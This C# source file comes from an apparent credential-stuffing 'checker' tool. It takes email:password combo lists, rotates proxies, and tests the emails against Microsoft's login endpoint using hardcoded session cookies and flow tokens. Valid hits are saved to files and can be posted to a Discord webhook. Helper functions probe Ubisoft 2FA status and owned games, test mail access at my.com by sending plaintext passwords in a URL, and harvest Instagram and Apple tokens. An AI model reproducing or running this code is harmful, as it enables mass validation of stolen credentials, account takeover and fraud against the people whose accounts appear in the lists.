using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class xboxvmkek
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!xboxvmcheck.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (xboxvmcheck.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = xboxvmcheck.RandomProxies();
								httpRequest.AddHeader("Cookie", "MSCC=74.82.28.71-US; wlidperf=FR=L&ST=1615401810151; MSPShared=1; SDIDC=CZEmyTlkly5YD7zirv0FiEkXWDRQPt7ZWs5xb8vBWSOsqL*eRUvUuI0NZCSmVGLV3GxzMAMGKwVJwHAM!TlqtECFihWkY2rgLhNHvN8bogqdpzi6dOE!2j4*90Tg3uwoolH0spa87b*JC88QY!XdgY8$; MSPRequ=id=N&lt=1615473113&co=1; uaid=f3e1dbf99b9044389241c330a43fa84b; OParams=11DUEOJuw9T4OOJoIYd665ENBskyf06gc6S9XV1SGYm*niIRpuUQb38zw1PMJOKuTHFSJjc4GN4CEdMXLdBqNr9u*UzRamm39ApmFDx1Hmsmzs0Ofoea8Uml1z97CcPHXDhIt8WUJ7WFCgDlEJF4Gd*hSlH1zTo4KwAuOYd8qSNzcXhPhvyeLjXJqd1XR!xYXCIT6W6T!Ap38k3YotOL!2wfHMj6583vGWZRFlse0LfDD0rSW4qeqZFrQTaeL99YKqpo08vR6zofpjNm6A2A!qdsOzmggFV25EpuqflGuKRtBUnxDfUUuXjxty1TNImVI6kgfQb5YcHOGH00Vqh2N!h5k3l5SmLuQ5psWjync1gSOzMjzvRX4F4Q5!*A*fddSy4ivp49*kI2dKsqJfjODmot7!dhRV1Ff9x!sqqR8cg0Io177bHlnvOx35qFIO6E0fIG0Vs!xc!msC6dhPDSMibFOZJLMkdqm9rgrhzTsuwK1dL6isaRZEZQV611yO7h2F5bJNwpA5nLH98I3Z0GbbRJEfdpZJuJyosb8nHw0sYc*F71Nm60QgI4jV1foBUryxEwPn13cTClukLZsxAo4AssoRVgd6AHSC8NVUxKrpc2FM8508ZC*FSHLtrNhC1rbPDvH3Cn1ammEcsJku01!xmTbfqVpJYV!houn4jfIEPlW4; MSPOK=$uuid-68fbc464-6627-42e6-a423-b6f25b6cf85f");
								string check = httpRequest.Post("https://login.live.com/GetCredentialType.srf?opid=025DDF2CE5F5522C&id=290794&client_id=000000004420578E&uiflavor=web&redirect_uri=https%3a%2f%2fsisu.xboxlive.com%2fconnect%2foauth%2fXboxLive&response_type=code&state=LAAAAAEB1xaDSBEnyvpgzbJ8rJu6npcq-702wbkF6bULv5rHURHZXR91t5cfZmZiZTdiMjEwNGY0NDIyOTk5MGE5MWNiODJhMzdlMmMx&client_id=000000004420578E&scope=XboxLive.Signin&lw=1&fl=dob,easi2&xsup=1&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&mkt=EN-US&lc=1033&uaid=f3e1dbf99b9044389241c330a43fa84b", "{\"username\":\"" + email + "\",\"uaid\":\"f3e1dbf99b9044389241c330a43fa84b\",\"isOtherIdpSupported\":false,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"DWJOpE3OqMhQDV!nAIeLJIH9jqCwuiP!Sfs2bG3U*EU8CqE2tu!5CqdxR!EP71E2QNi6mz3ZISmoL2hOHSm8v1MmwA8!nCRCF9tn5O0kneyZ3z3Fgaz4**zddQWtOtOQ54VVjFuuiftBdR0GN3Lrb51p9VaV2HYHfRRVHkBDZ87je*g9xL6iMqEsgoZ!hDlfz2270zbLmVPKVjFBCHoeTSk$\"}", "application/json").ToString();
								if (check.Contains("IfExistsResult\":0"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref xboxvmcheck.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref xboxvmcheck.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref xboxvmcheck.Hits); Interlocked.Increment(ref stats.hits);
										if (Program.config.showgood == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
										}
										if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
									}
									break;
								}
								else if (check.Contains("IfExistsResult\":1"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref xboxvmcheck.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref xboxvmcheck.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref xboxvmcheck.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showbad == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else
								{
									string acc1 = email + ":" + password;
									xboxvmcheck.Combo.Enqueue(acc1);
									Interlocked.Increment(ref xboxvmcheck.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								xboxvmcheck.Combo.Enqueue(acc1);
								Interlocked.Increment(ref xboxvmcheck.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = xboxvmcheck.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref xboxvmcheck.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = xboxvmcheck.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref xboxvmcheck.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = xboxvmcheck.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = xboxvmcheck.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					xboxvmcheck.Combo.Enqueue(acc1);
					Interlocked.Increment(ref xboxvmcheck.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = xboxvmcheck.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref xboxvmcheck.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
